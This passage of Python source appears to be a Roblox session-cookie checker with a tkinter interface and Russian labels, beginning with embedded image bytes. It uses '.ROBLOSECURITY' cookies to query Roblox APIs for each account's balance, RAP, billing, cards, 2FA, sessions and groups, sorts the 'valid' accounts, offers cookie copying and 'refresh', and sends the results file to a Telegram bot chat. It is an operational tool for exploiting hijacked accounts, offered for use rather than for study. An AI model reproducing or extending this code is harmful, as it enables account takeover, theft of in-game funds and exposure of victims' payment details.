\xbd\xdc\xe4\xefi+\xf6}!t\x10\x84G\x01\xc0_\x18,t\xbdU\xae\x7f\x93\xb1:\x04\xa4Li\xe2V?\xae\xf6\xc7\x04\n\x00\xf63X\xe8z\x8d\xa4oJj\n\x1c\x05@u\x8c\x9b\xdb\x1b\xdb6\xf4|;t\x104\x0e\n\x00\x1e\xd5@g\xf7\xcb\xcd\xf5\x1d\xc9\xf3\xa1\xb3\x00\x98\x94\x11\x93\xbdr\xe2I\xa0\xc0\xc3(\x008\xa0\xc1\xce\xae%r].iz\xe8,\x00*2d\xd2K\xdb\x8a\xbd\xc5\xd0A\xd0x(\x00xL\x83g,9AQ\xd4\'\xe9\xe8\xd0Y\x00\x94\xc3\xef\x8ac-\x99\xbd\xb1\xef\xb7\xa1\x93\xa01q\xa1\x17\x1eS\xfb\xc6U\xb7\x95\xf2\xd1\xf3$\xdd\x1c:\x0b\x80Cc\xd2\x8dc\xb9\xdc\xf3\x18\xfex,\x14\x00\x1c\xd4\x9c\x9f\xac\xdc4\xae\xa9g\xc8\xc5[\xc2\x80\xc6\xf7\xc3=\xadV8|\xed\xca-\xa1\x83\xa0\xb1q\n\x00\x87\xcc\x0b\x85\xa6!M\xff\x92\xa4\xb7\x86\xce\x02`\x7f\xee\xfab\xfb\xdc\xa9\xef\xb1\x15+J\xa1\xb3\xa0\xf1Q\x00P\xb6\xc1B\xf7\x07%\xff\xb8\xd8~\x80FQ2\xe9\xbdm\xc5\xde\x7f\r\x1d\x04\xc9\xc1\x0e\x1c\x15\x19\xec\\\xbaTn\xdf\x914+t\x16 \xe3\x06<\xb2Ww\xac\xebY\x13:\x08\x92\x85\x02\x80\x8a\xdd\x7fF\xd7\x93J\x91}_\xf2\x13Bg\x012\xea\xe6(\xb6\x97\xcd\xda\xd8sg\xe8 H\x1e.\x02D\xc5fn\xec\xfd\xc3\xb8\xa6<_\xd2\xe5\xa1\xb3\x00\x99c\xfa\xf6p\xab\x9d\xc6\xf0G\xa5X\x01@U\x0cv.=O\x1e}\x99\'\x07\x0257b\xd2\x05\x9c\xef\xc7dQ\x00P5\x83\x0b\x97\x9e.\xb3+$\xcd\x0b\x9d\x05H\xa9{]\xb6\xac\xa3\xd8sC\xe8 H>N\x01\xa0j\xda7\xf4]\x13Gz\x96\xbb\xd6\x85\xce\x02\xa4Po\xbeTz&\xc3\x1f\xd5\xc2\n\x00\xaa\xce%\xdb^\xe8z\x97K\x17Kj\t\x9d\x07H\xb8a\x93.\x9cU\xec\xfd\xa2I\x1e:\x0c\xd2\x83\x02\x80\x9a\x19,,}\xba\x14\xfd7w\t\x00\x15\xfb\xb5r\xd1\xab\xdb\xd7\xae\xbc5t\x10\xa4\x0f\xa7\x00P3\xed\xc5\xbe_\xed\x1a\x99\xf2\\w}Q\x1c\xb9\x00\xe5pw}\xb1mji\x01\xc3\x1f\xb5\xc2\n\x00\xeab\xa0s\xe99\xe6\xf6Mq\x81 \xf0\x98L\xda\xe2\xa67\xb6\xaf\xef\xe5\xdd\x1b\xa8)V\x00P\x17\x1d\xeb\xfb\xae*\x95\xc6\x9e\xe9\xd2\x95\xa1\xb3\x00\r\xcb\xf5\xdf9\xd9\xd3\x19\xfe\xa8\x07V\x00Pw\x83\x0b\xbb\xbae\xfa\x8a\xa4\xc7\x85\xce\x024\x04\xd7&3{G[\xb1\xe7\x87\xa1\xa3 ;X\x01@\xdd\xb5o\xe8\xedQ\xd3\xf0\xd3\xdd\xf5E\xb9\xe2\xd0y\x80`\\\xb1\xdc\xbe^\x1a\x8f\x8eg\xf8\xa3\xdeX\x01@P\x83\x85\xee\xd3$\xff\x86\xa4\xe3Cg\x01\xea\xecW.{3\xf7\xf5#\x14\n\x00\x82\xbb\xb3P\x982\xd3\xa6\x7fDn\xef\xe3Q\xc2\xc8\x80a\x93>9k\xe7}\x17\xdbM7\x8d\x85\x0e\x83\xec\xa2\x00\xa0al[\xb4\xe4\xc9\xb9R\xf4YI]\xa1\xb3\x005\xd2\x1bE\xa5\xf3g\xad[}{\xe8 \x00\x05\x00\r\xa7\xbf\xb0\xf4\xacH\xf6yIO\x0f\x9d\x05\xa8\x92\xdf\xba\xe2\xf7t\x14W\xfd8t\x10`/\n\x00\x1a\x92/X\x90\x1f\x9a1\xef\rr\xfb\xa4\xa4\xd9\xa1\xf3\x00\x15q\r\x9a\xe9\x9ff\xcd\x99\xfae[\xb1\xa2\x14:\x0e\xf0H\x14\x004\xb4\xfb\xcf9\xa7}|8\xffQ3\xbd]RS\xe8<\xc0\xa1\xb11\xb9.m2}pF\xb1\xa7?t\x1a\xe0\xd1P\x00\x90\x08\x13\xef\x15\xd0\'$;Wl\xb7hT\xaeX\xa6\x15%\x8b>:g\xfd\xca\xdf\x87\x8e\x03<\x16v\xa4H\x94\xc13\x96\x9c`\xb9\xdc\x87\xdd}Y\xe8,\xc0#\x99t\xb5Ev\xc1\xacu=\xff\x1b:\x0bp((\x00H\xa4\x81B\xf7\xf3L\xfeAq\xc7\x00\x023\xe9jS\xfc\x81Y\xc5U\xbf\x08\x9d\x05(\x07\x05\x00\x896\xd8y\xee\xa9r\xff\xb8\xe4\x9d\xa1\xb3 k\xfcZ\xb3\xe8\x83m\xeb{6\x84N\x02T\x82\x02\x80T\xe8/,=+r\xfb\x07\x99^ \xb6k\xd4\xca\xc49\xfe>\xb9\xffK\xfb\x86\xbekB\xc7\x01&\x83\x1d%Re\xf0\x8c%\'\xc8r\x7f\'\xf3\xd7I\x9a\x12:\x0fR\xc25\xaaH\x97{\x94\xfbT\xc7\xda\x1f\xfd&t\x1c\xa0\x1a(\x00H\xa5-\x8b\xce=\xbc\xa9\x14\xbf\xcd\\\xef\x94\xa9=t\x1e$\x95\xdd\xef\xee\xdf\x8a\x9b\xa3\x8b\xe7\xfcd\xe5\xa6\xd0i\x80j\xa2\x00 \xd5\xb6\x9dznkS\xbe\xf4\xb7.{\x97\xa4\xc7\x87\xce\x83dp\xe9\x0ff\xf6\x85\xe1\xe9\xfa\xe6\x91==\xbbC\xe7\x01j\x81\x02\x80Lp-\x8f\x06\n7\x9e\x99\xb3\xe8<\x8f\xfdE25\x87\xce\x84\x863bf+K\x1e\x7f\xbd\xa3\xd8\xb7\xd6$\x0f\x1d\x08\xa8%\n\x002g\xfbiK\xdb\xe2\xbc\x96\xc9\xed\x9d\xe2}\x03\x90~/\xf9\xa5\xf9R|I\xeb5\xab\xb7\x85\x0e\x03\xd4\x0b\x05\x00\x99\xb6\xbds\xe9\x828\x8e\xce\x93\xfc\xff\xc94-t\x1e\xd4\xcd\xb0\x99\xf5p\xb4\x8f,\xa3\x00\x00\x9aX\x15\xf0\x9c\xbd\xd8\xcd^.\xf9Y\xe2\xbd\x03\xe9\xe3\x1a\x95i\x8d\xb9]\x11O\x1b\xffQ\xc7\xea\xd5;BG\x02B\xa2\x00\x00\xfb\xd8~\xda\xd26\xcf[\xb7\xbb\x96Iv\x8e\xe4\xf9\xd0\x99P\xb1\x92\xe47\x98lES\xa9\xf4\xdf,\xf1\x03\x0f\xa3\x00\x00\x8fa\xe7\xd9/\x99;62\xfa2\x99\xbdB\xd2i\x92r\xa13\xe1\xa0\xc6M*\xc6\xb2\xcb\xf3\xb9\xa6+g\xac\xbdr t \xa0\x11Q\x00\x80C4\xf1j\xe2\xa6E\xa6\xe8,\x99/\x91\xf4\xb8\xd0\x990\xc1][\xa3\xc86H\xdekc\xde3\xeb\xa7}C\xa13\x01\x8d\x8e\x02\x00Th\xa0\xb3\xfbi\xe6q\x97\xc9\xcer\xd7\x19\xdcZXW%I\xbft\xa97g\xde3s}\xdf\xffr!\x1fP\x1e\n\x00P\x05C\x85\x17\xcf\x92\x8d\x9d\x19{tz\xe4\xfe|7=S\\HX=\x13\x17\xf0\xddd\xb2\xebd\xf1\xc6\xf1\xd1\xdc\xfa9\xd7\xae\xdc\x19:\x16\x90d\x14\x00\xa0\x066uwO\x9b\xb2S\xcf4\xf9\x02\x99\x9d\xea\xeegJ\xea\x08\x9d+Av\x9a\xf4\xb3X\xba\xd6\xe5?\xdd32\xed\xda\xa3\xaf_\xb1\'t( M(\x00@\x1d\xb8\x96GCg\xfc\xfci\x1e\xe5\x9ek\xa6\x13\xe5~\x82\\\'\xf2\x9e\x02IR\xbfK\xb7Hv\x9b,\xbeMQ\xd3\r\xedk\x7f\xf4[\x96\xf4\x81\xda\xa2\x00\x00\x01\xf5\x9f\xd9u\x94\xc5\xf1\tf\xd1\x89r;A\xf2\x13$=E\xe9|\x93\xe1\x1eI\xbf\x93\xeb67\xbbMn\xb7\x94l\xfc\xb6\xb9\xc5U\x9bC\x07\x03\xb2\x88\x02\x004\xa0\xed\xa7-mS^\xf3K\xb1\xe6\x9bi\xbe<\x9ao\xe6\xf3\xdd\xfdH\x99=^\xd2\xd4\xd0\x19\xf7gcr\xbfG\xe6\xf7\x99E\x9b\xdcu\x87,\xbe#v\xdd\xd1\xd4\xa4;f^\xfd\xec\xbbL\xcb\xe3\xd0)\x01L\xa0\x00\x00\t\xe3\xcb\x96\xe5\xfa7\xef\x98\x9b\xcb5u\x98E\x1d\xb14\xdb\xdc\xe7H\xd6a\x16wxl\x1d2\xeb\x90{\x9bL-\x13\xbfIm\x92\xf4\xe0\xff\xde\xfb\xc8\xe3\x19\x9ax\xae\xc1\xb8\xa4\xbd\x17\xd4\xed\x9a\xb8\xe0\xce\\\xf2\xed\x0f~\xe3\xb0dC.\x1b\x88\xdc\x07<\xf2\x01I\xfd&\xf5K\xd1\x80{<0.\xef\x9fS|\xceV\x06<\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x93\xf3\xff\x01/\xf5l\xf5\x054\xc7\x85\x00\x00\x00\x00IEND\xaeB`\x82'))
        resized_image = image.resize(size)
        photo = ImageTk.PhotoImage(resized_image)

    label_image = tk.Label(frame, image=photo, bg="#2c2c2c")
    label_image.image = photo
    label_image.pack(side=tk.TOP, fill=tk.BOTH, expand=True)

    label_text = tk.Label(frame, text=text, font=("Arial", 16), bg="#2c2c2c", fg="white", anchor=tk.CENTER)
    label_text.pack(side=tk.TOP, fill=tk.BOTH, expand=True)

def menu_settings(event):
    def save_settings():
        global config
        data = {
            "Sorting": {
                "Balance": balance_entry.get(),
                "Donate": donate_entry.get(),
                "Rap": rap_entry.get(),
                "Premium": premium_combobox.get()
            },
            "Badges | Gamepasses": {
                "Badges": badges_entry.get(),
                "Gamepasses": gamepasses_entry.get()
            },
            "Telegram": {
                "Enabled": telegram_endabled_combobox.get(),
                "Token": bot_token_entry.get(),
                "Chat_ID": chat_id_entry.get()
            },
            "Other": {
                "Multi_Fresher_Method": multi_fresher_method_combobox.get(),
                "Picture": picture_combobox.get(),
                "Marker": marker_combobox.get(),
                "Proxy": proxy_combobox.get(),
                "Link_TP": loading_image_entry.get(),
                "Auto_Save": auto_save_combobox.get()
            }
        }

        with open("config.json", "w", encoding='utf-8') as config_file:
            json.dump(data, config_file, indent=4)

        messagebox.showinfo("Успех", "Настройки успешно сохранены!")
        try:
            config = open('config.json', 'r', encoding='utf-8')
            config = json.load(config)
        except:
            pass

    def load_settings():
        try:
            with open("config.json", "r") as file:
                data = json.load(file)

                balance_entry.delete(0, tk.END)
                balance_entry.insert(0, data["Sorting"]["Balance"])

                donate_entry.delete(0, tk.END)
                donate_entry.insert(0, data["Sorting"]["Donate"])

                rap_entry.delete(0, tk.END)
                rap_entry.insert(0, data["Sorting"]["Rap"])

                premium_combobox.set(data["Sorting"]["Premium"])

                badges_entry.delete(0, tk.END)
                badges_entry.insert(0, data["Badges | Gamepasses"]["Badges"])

                gamepasses_entry.delete(0, tk.END)
                gamepasses_entry.insert(0, data["Badges | Gamepasses"]["Gamepasses"])

                telegram_endabled_combobox.set(data["Telegram"]["Enabled"])

                bot_token_entry.delete(0, tk.END)
                bot_token_entry.insert(0, data["Telegram"]["Token"])

                chat_id_entry.delete(0, tk.END)
                chat_id_entry.insert(0, data["Telegram"]["Chat_ID"])

                picture_combobox.set(data["Other"]["Picture"])
                multi_fresher_method_combobox.set(data["Other"]["Multi_Fresher_Method"])
                proxy_combobox.set(data["Other"]["Proxy"])

                loading_image_entry.delete(0, tk.END)
                loading_image_entry.insert(0, data["Other"]["Link_TP"])
                marker_combobox.set(data["Other"]["Marker"])
                auto_save_combobox.set(data["Other"]["Auto_Save"])

        except FileNotFoundError:
            messagebox.showwarning("Предупреждение", "Файл config.json не найден. Используются значения по умолчанию.")
        except json.JSONDecodeError:
            messagebox.showerror("Ошибка", "Невозможно прочитать файл config.json. Используются значения по умолчанию.")

    def create_frame(parent, title):
        frame = ttk.LabelFrame(parent, text=title, padding=(10, 5), style="Custom.TLabelframe")
        frame.pack(padx=10, pady=5, fill=tk.BOTH, expand=True)
        return frame

    settings_frame = tk.Toplevel(root)
    settings_frame.title("Настройки")
    settings_frame.geometry('350x650')
    settings_frame.config(bg="#545454")
    settings_frame.resizable(False, False)
    settings_frame.wm_attributes("-topmost", 1)
    settings_frame.overrideredirect(True)

    def on_drag_start(event):
        settings_frame._drag_data = {'x': event.x, 'y': event.y}

    def on_drag_motion(event):
        x = settings_frame.winfo_x() - settings_frame._drag_data['x'] + event.x
        y = settings_frame.winfo_y() - settings_frame._drag_data['y'] + event.y
        settings_frame.geometry(f'+{x}+{y}')

    settings_frame.bind("<ButtonPress-1>", on_drag_start)
    settings_frame.bind("<B1-Motion>", on_drag_motion)

    title_bar = tk.Frame(settings_frame, bg="#2c2c2c", height=25)
    title_bar.pack(fill=tk.X)

    title_label = tk.Label(title_bar, text="Настройки", bg="#2c2c2c", bd=0, font=("Arial", 10), fg='white')
    title_label.pack(side=tk.LEFT, padx=5, pady=2)

    close_button = tk.Button(title_bar, text="❌", command=settings_frame.destroy, bg="#2c2c2c", fg="white", bd=0,font=("Arial", 10))
    close_button.pack(side=tk.TOP, anchor=tk.NE, padx=5, pady=5)

    style = ttk.Style()
    style.configure("Custom.TLabelframe", background="#2c2c2c", foreground="#2c2c2c")
    style.configure("Custom.TLabelframe.Label", background="#2c2c2c", foreground="white")
    style.configure("TLabel", background="#2c2c2c", foreground="white")
    style.configure("TEntry", fieldbackground="white", foreground="black")
    style.configure("TCombobox", fieldbackground="white", foreground="black")
    style.configure("TButton", background="#2c2c2c", foreground="white")

    sorting_frame = create_frame(settings_frame, "Сортировка")

    balance_label = ttk.Label(sorting_frame, text="Балансы (через запятую):")
    balance_label.grid(row=0, column=0, padx=5, pady=2, sticky='w')
    balance_entry = ttk.Entry(sorting_frame)
    balance_entry.grid(row=0, column=1, padx=5, pady=2, sticky='ew')

    donate_label = ttk.Label(sorting_frame, text="Донаты (через запятую):")
    donate_label.grid(row=1, column=0, padx=5, pady=2, sticky='w')
    donate_entry = ttk.Entry(sorting_frame)
    donate_entry.grid(row=1, column=1, padx=5, pady=2, sticky='ew')

    rap_label = ttk.Label(sorting_frame, text="Rap (через запятую):")
    rap_label.grid(row=2, column=0, padx=5, pady=2, sticky='w')
    rap_entry = ttk.Entry(sorting_frame)
    rap_entry.grid(row=2, column=1, padx=5, pady=2, sticky='ew')

    premium_label = ttk.Label(sorting_frame, text="Premium:")
    premium_label.grid(row=3, column=0, padx=5, pady=2, sticky='w')
    premium_combobox = ttk.Combobox(sorting_frame, values=["True", "False"])
    premium_combobox.set("False")
    premium_combobox.grid(row=3, column=1, padx=5, pady=2, sticky='ew')

    badges_frame = create_frame(settings_frame, "Бэйджи и гп")

    badges_label = ttk.Label(badges_frame, text="Бэйджи (через запятую):")
    badges_label.grid(row=0, column=0, padx=5, pady=2, sticky='w')
    badges_entry = ttk.Entry(badges_frame)
    badges_entry.grid(row=0, column=1, padx=5, pady=2, sticky='ew')

    gamepasses_label = ttk.Label(badges_frame, text="Гп (через запятую):")
    gamepasses_label.grid(row=1, column=0, padx=5, pady=2, sticky='w')
    gamepasses_entry = ttk.Entry(badges_frame)
    gamepasses_entry.grid(row=1, column=1, padx=5, pady=2, sticky='ew')

    telegram_frame = create_frame(settings_frame, "Telegram")

    telegram_endabled_lable = ttk.Label(telegram_frame, text="Отправлять в telegram:")
    telegram_endabled_lable.grid(row=0, column=0, padx=5, pady=2, sticky='w')
    telegram_endabled_combobox = ttk.Combobox(telegram_frame, values=["True", "False"])
    telegram_endabled_combobox.set("False")
    telegram_endabled_combobox.grid(row=0, column=1, padx=5, pady=2, sticky='ew')

    bot_token_lable = ttk.Label(telegram_frame, text="Токен бота:")
    bot_token_lable.grid(row=1, column=0, padx=5, pady=2, sticky='w')
    bot_token_entry = ttk.Entry(telegram_frame)
    bot_token_entry.grid(row=1, column=1, padx=5, pady=2, sticky='ew')

    chat_id_lable = ttk.Label(telegram_frame, text="Chat ID:")
    chat_id_lable.grid(row=2, column=0, padx=5, pady=2, sticky='w')
    chat_id_entry = ttk.Entry(telegram_frame)
    chat_id_entry.grid(row=2, column=1, padx=5, pady=2, sticky='ew')

    other_frame = create_frame(settings_frame, "Другое")

    multi_fresher_method = ttk.Label(other_frame, text="Способ мульти рефреша:")
    multi_fresher_method.grid(row=0, column=0, padx=5, pady=2, sticky='w')
    multi_fresher_method_combobox = ttk.Combobox(other_frame, values=["Main", "Site(Risky)"])
    multi_fresher_method_combobox.set("Main")
    multi_fresher_method_combobox.grid(row=0, column=1, padx=5, pady=2, sticky='ew')

    auto_save_lable = ttk.Label(other_frame, text="Авто-сохранение валидок:")
    auto_save_lable.grid(row=1, column=0, padx=5, pady=2, sticky='w')
    auto_save_combobox = ttk.Combobox(other_frame, values=["True", "False"])
    auto_save_combobox.set("False")
    auto_save_combobox.grid(row=1, column=1, padx=5, pady=2, sticky='ew')

    picture_label = ttk.Label(other_frame, text="Picture:")
    picture_label.grid(row=2, column=0, padx=5, pady=2, sticky='w')
    picture_combobox = ttk.Combobox(other_frame, values=["True", "False"])
    picture_combobox.set("False")
    picture_combobox.grid(row=2, column=1, padx=5, pady=2, sticky='ew')

    marker_label = ttk.Label(other_frame, text="Маркеры:")
    marker_label.grid(row=3, column=0, padx=5, pady=2, sticky='w')
    marker_combobox = ttk.Combobox(other_frame, values=["True", "False"])
    marker_combobox.set("True")
    marker_combobox.grid(row=3, column=1, padx=5, pady=2, sticky='ew')

    proxy_label = ttk.Label(other_frame, text="Proxy:")
    proxy_label.grid(row=4, column=0, padx=5, pady=2, sticky='w')
    proxy_combobox = ttk.Combobox(other_frame, values=["True", "False"])
    proxy_combobox.set("False")
    proxy_combobox.grid(row=4, column=1, padx=5, pady=2, sticky='ew')

    loading_image_lable = ttk.Label(other_frame, text="Прямая ссылка \nна картинку загрузки:")
    loading_image_lable.grid(row=5, column=0, padx=5, pady=2, sticky='w')
    loading_image_entry = ttk.Entry(other_frame)
    loading_image_entry.grid(row=5, column=1, padx=5, pady=2, sticky='ew')

    save_button = tk.Button(settings_frame, text="Сохранить", command=save_settings, bg="#545454", fg='white',
                            relief="ridge", activebackground="#545454")
    save_button.pack(pady=5)

    load_settings()



try:
    config = open('config.json', 'r', encoding='utf-8')
    config = json.load(config)
    print(config)
except:
    notification('Файл конфига не обнаружен\nУстановлено значение по умолчанию', False, 'Конфиг', (150, 150))
    config = {'Sorting': {'Balance': '100,1000,10000', 'Donate': '1, 1000, 50000', 'Rap': '', 'Premium': 'True'},
              'Badges | Gamepasses': {'Badges': '', 'Gamepasses': ''}, 'Other': {'Picture': 'True', 'Proxy': 'False'}}

def telegram_send(text):
    bot = telebot.TeleBot(str(config['Telegram']['Token']))
    bot.send_document(int(config['Telegram']['Chat_ID']), open(r"Results/Valid.txt", 'rb'), caption=text)

def add_user_to_inner_frame(username, balance, donate, rap, billing, src, premium, cards, bd, gp, pending, mail, creation_date, two_fa, krb_hd, cookie):
    block_frame = tk.Frame(inner_frame, bg="#545454", borderwidth=1, relief=tk.RAISED, width=370, height=100)
    block_frame.pack(fill=tk.X, expand=True, anchor=tk.W)
    block_frame.pack_propagate(False)

    try:
        response = requests.get(src)
        image = Image.open(BytesIO(response.content))
        image = image.resize((90, 90))
        if config["Other"]["Marker"] == 'True':
            try:
                markers = []
                if balance > 100:
                    marker_response = requests.get('https://i.postimg.cc/25jZz7kj/66ce4363c927b327580622de-1500-robux-read-disc-roblox-Photoroom.png')
                    marker_image = Image.open(BytesIO(marker_response.content)).resize((20, 20))
                    markers.append(marker_image)
                if donate > 10000:
                    marker_response = requests.get("https://i.postimg.cc/LXwY3dzh/images-Photoroom.png")
                    marker_image = Image.open(BytesIO(marker_response.content)).resize((20, 20))
                    markers.append(marker_image)
                if rap > 5000:
                    marker_response = requests.get("https://i.postimg.cc/mkLqjqBf/no-Filter-Photoroom.png")
                    marker_image = Image.open(BytesIO(marker_response.content)).resize((20, 20))
                    markers.append(marker_image)
                if krb_hd:
                    marker_response = requests.get('https://i.postimg.cc/zvqCgY5W/no-Filter-Photoroom-2.png')
                    marker_image = Image.open(BytesIO(marker_response.content)).resize((20, 20))
                    markers.append(marker_image)
                if bd not in ["null", "error", "Disabled"]:
                    marker_response = requests.get('https://i.postimg.cc/FHFhnWFZ/images-Photoroom-1.png')
                    marker_image = Image.open(BytesIO(marker_response.content)).resize((20, 20))
                    markers.append(marker_image)

                for i, marker in enumerate(markers):
                    image.paste(marker, (i * 20, 0), marker)
            except:
                pass

        photo = ImageTk.PhotoImage(image)
        label_image = tk.Label(block_frame, image=photo, width=90, height=90, bg="#545454")
        label_image.image = photo
        label_image.pack(side=tk.LEFT, padx=(0, 10))
    except Exception as e:
        label_image = tk.Label(block_frame, text="No Image", width=10, height=5, bg="#545454", fg="white")
        label_image.pack(side=tk.LEFT, padx=(0, 10))

    info_frame = tk.Frame(block_frame, bg="#545454")
    info_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

    local_balance = 'Disabled' if balance == -2 else balance
    local_donate = 'Disabled' if donate == -2 else donate
    local_rap = 'Disabled' if rap == -2 else rap

    labels = [
        f"{username}",
        f"💰 Balance: {local_balance}",
        f"✨ Donate: {local_donate}",
        f"💎 Rap: {local_rap}"
    ]

    for i, label_text in enumerate(labels):
        tk.Label(info_frame, text=label_text, font=("Helvetica", 10), bg="#545454", fg="white").grid(row=i, column=0,
                                                                                                     sticky=tk.W)

    button_frame = tk.Frame(block_frame, bg="#545454")
    button_frame.pack(side=tk.RIGHT, fill=tk.Y)

    button_style = {"font": ("Helvetica", 8), "bg": "#3e3e3e", "fg": "white", "width": 6, "height": 1, "bd": 0}

    info_button = tk.Button(button_frame, text="Info",
                            command=lambda: show_info(username, local_balance, local_donate, local_rap, billing,
                                                      premium, cards, bd, gp, pending, src, mail, creation_date, two_fa, cookie), **button_style)
    copy_button = tk.Button(button_frame, text="Copy", command=lambda: copy_cookie(cookie), **button_style)
    refresh_button = tk.Button(button_frame, text="Refresh", command=lambda: cookie_fresher(cookie), **button_style)

    info_button.pack(side=tk.TOP, pady=1)
    copy_button.pack(side=tk.TOP, pady=1)
    refresh_button.pack(side=tk.TOP, pady=1)

    inner_frame.update_idletasks()
    canvas.config(scrollregion=canvas.bbox("all"))

def show_info(username, local_balance, local_donate, local_rap, billing, premium, cards, bd, gp, pending, src, mail, creation_date, two_fa, cookie):
    def show():
        def get_favorites():
            try:
                while True:
                    try:
                        userid = requests.get("https://www.roblox.com/my/settings/json",
                                              cookies={".ROBLOSECURITY": cookie}).json()['UserId']
                        break
                    except:
                        pass
                favorites_data = requests.get(
                    f'https://www.roblox.com/users/favorites/list-json?assetTypeId=9&itemsPerPage=5&userId={userid}').json()
                if 'Data' in favorites_data and 'TotalItems' in favorites_data['Data'] and favorites_data['Data'][
                    'TotalItems'] > 0:
                    favorites = favorites_data['Data']
                    asset_ids = [item["Item"]["Name"] for item in favorites['Items']]
                    asset_thumbnails = [item["Thumbnail"]["Url"] for item in favorites['Items']]
                    finnal_result = {}
                    for i in range(len(favorites['Items'])):
                        finnal_result[str(i + 1)] = {
                            "name": asset_ids[i],
                            "thumbnail": asset_thumbnails[i]
                        }
                    return finnal_result
            except Exception as e:
                print(f"Ошибочка на получение фавориток - на почитай(все предусмотрено, просто забей): {e}")
            return []

        def check_sessions():
            while True:
                sessions = requests.get('https://apis.roblox.com/token-metadata-service/v1/sessions',
                                        cookies={'.ROBLOSECURITY': cookie}).json()['sessions']
                try:
                    sessions = len(sessions) - 1
                    if sessions >= 25:
                        return "25+"
                    else:
                        return sessions
                except:
                    pass

        def get_country():
            while True:
                try:
                    req = requests.get('https://users.roblox.com/v1/users/authenticated/country-code',
                                       cookies={".ROBLOSECURITY": cookie}).json()['countryCode']
                    return req
                except:
                    pass

        def get_account_groups():
            while True:
                try:
                    userid = \
                    requests.get("https://www.roblox.com/my/settings/json", cookies={".ROBLOSECURITY": cookie}).json()[
                        'UserId']
                    break
                except:
                    pass
            req = requests.get(f'https://groups.roblox.com/v1/users/{userid}/groups/primary/role',
                               cookies={".ROBLOSECURITY": cookie}).text
            if req == "null":
                return None
            else:
                return True

        info_window = tk.Toplevel(root)
        info_window.geometry("750x850")
        info_window.resizable(False, False)
        info_window.overrideredirect(True)
        info_window.wm_attributes("-topmost", 1)
        info_window.configure(bg="#2c2c2c")

        def on_drag_start(event):
            info_window._drag_data = {'x': event.x, 'y': event.y}

        def on_drag_motion(event):
            x = info_window.winfo_x() - info_window._drag_data['x'] + event.x
            y = info_window.winfo_y() - info_window._drag_data['y'] + event.y
            info_window.geometry(f'+{x}+{y}')

        info_window.bind("<ButtonPress-1>", on_drag_start)
        info_window.bind("<B1-Motion>", on_drag_motion)

        title_bar = tk.Frame(info_window, bg="#545454", height=25)
        title_bar.pack(fill=tk.X)

        title_label = tk.Label(title_bar, text=f"Информация о {username}", bg="#545454", bd=0, font=("Arial", 10),
                               fg='white')
        title_label.pack(side=tk.LEFT, padx=5, pady=2)

        close_button = tk.Button(title_bar, text="❌", command=info_window.destroy, bg="#545454", bd=0,
                                 font=("Arial", 10),
                                 fg='white')
        close_button.pack(side=tk.RIGHT, padx=0, pady=0)

        main_frame = tk.Frame(info_window, bg="#2c2c2c", padx=20, pady=20)
        main_frame.pack(fill=tk.BOTH, expand=True)

        top_frame = tk.Frame(main_frame, bg="#2c2c2c")
        top_frame.pack(fill=tk.X, pady=(0, 20))

        try:
            response = requests.get(src)
            image = Image.open(BytesIO(response.content))
            resized_image = image.resize((150, 150))
            photo = ImageTk.PhotoImage(resized_image)
            avatar_label = tk.Label(top_frame, image=photo, bg="#2c2c2c")
            avatar_label.image = photo
            avatar_label.pack(side=tk.LEFT, padx=(0, 20))
        except:
            avatar_label = tk.Label(top_frame, text="Нет аватара", bg="#2c2c2c", fg="white", width=20, height=10)
            avatar_label.pack(side=tk.LEFT, padx=(0, 20))

        info_frame = tk.Frame(top_frame, bg="#2c2c2c")
        info_frame.pack(side=tk.LEFT, fill=tk.Y)

        tk.Label(info_frame, text=username, font=("Helvetica", 18, "bold"), bg="#2c2c2c", fg="white").pack(anchor="w")
        tk.Label(info_frame, text=f"Баланс: {local_balance} | Донат: {local_donate}", font=("Helvetica", 12),
                 bg="#2c2c2c",
                 fg="#a0a0a0").pack(anchor="w")
        tk.Label(info_frame, text=f"RAP: {local_rap} | Премиум: {premium}", font=("Helvetica", 12), bg="#2c2c2c",
                 fg="#a0a0a0").pack(anchor="w")

        copy_button = tk.Button(info_frame, text="Копировать cookie", font=("Helvetica", 12),
                                command=lambda: pyperclip.copy(cookie), bg="#4c4c4c", fg="white",
                                activebackground="#5c5c5c", activeforeground="white", relief=tk.FLAT)
        copy_button.pack(anchor="w", pady=(10, 0))
        open_button = tk.Button(info_frame, text="Открыть профиль", font=("Helvetica", 12),
                                command=lambda: open_user_page(username), bg="#4c4c4c", fg="white",
                                activebackground="#5c5c5c", activeforeground="white", relief=tk.FLAT)
        open_button.pack(anchor="w", pady=(10, 0))

        bottom_frame = tk.Frame(main_frame, bg="#2c2c2c")
        bottom_frame.pack(fill=tk.BOTH, expand=True)

        details = [
            ("💰 Баланс", local_balance),
            ("✨ Донат", local_donate),
            ("⌛ Пендинг", pending),
            ("💎 RAP", local_rap),
            ("💸 Биллинг", billing),
            ("👑 Премиум", premium),
            ("📩 Почта", mail),
            ("📅 Дата создания", creation_date),
            ("🔐 2FA", two_fa),
            ("🌎 Страна", get_country()),
            ("👥 Количество сессий", check_sessions()),
            ("🤝 Свои группы", get_account_groups()),
            ("💳 Карты", cards),
            ("🏆 Бэйджи", bd),
            ("🎮 Геймпассы", gp)
        ]

        for i, (label, value) in enumerate(details):
